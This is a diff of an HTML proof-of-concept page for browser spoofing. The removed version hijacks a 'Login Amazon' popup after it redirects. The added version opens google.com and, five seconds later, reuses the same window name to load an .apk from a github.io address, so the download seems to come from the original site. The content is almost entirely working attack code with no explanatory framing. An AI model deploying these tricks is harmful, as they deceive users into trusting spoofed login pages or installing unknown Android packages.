@@ -1,26 +1,31 @@
-<script>
-  function next() {
-    w.location.replace('http://www.google.com/csi');
-  }
 
-  function f() {
-    // Open popup and write content, then redirect to jody.com
-    w = window.open(
-      "javascript:document.write('<h1>HAI</h1><img src=\"https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSZhxeX_u6aNBy3AZD1L6xyOga8fzXJuyUtxg&s\" width=\"300\" onclick=\"document.body.innerHTML += \\'<p>Gambar diklik!</p>\\'\">'); location='http://amazon.com';",
-      "new",
-      "width=500,height=500"
-    );
-
-    // Monitor popup navigation
-    i = setInterval(function() {
-      try {
-        x = w.location.href; // try to access popup location
-      } catch (e) {
-        clearInterval(i);
-        next(); // call next() when popup becomes cross-origin
-      }
-    }, 100);
-  }
-</script>
-
-<a href="#" onclick="f()">Login Amazon</a>
+<html>
+ <head> 
+  <meta charset="utf-8">
+<style>
+.button {
+  background-color: #4CAF50;
+  border: none;
+  color: white;
+  padding: 15px 32px;
+  text-align: center;
+  text-decoration: none;
+  display: inline-block;
+  font-size: 16px;
+  margin: 4px 2px;
+  cursor: pointer;
+}
+</style>
+ </head> 
+ <body> 
+  <script>
+function a(){
+	window.open('https://google.com', 'x');
+	setTimeout(function(){
+		window.open('https://frozzipies.github.io/test.apk', 'x');
+	}, 5000);
+}
+</script> 
+  <center><input type="button" class="button" value="Download From Original Site" onclick="a()"> </center>
+ </body>
+</html>
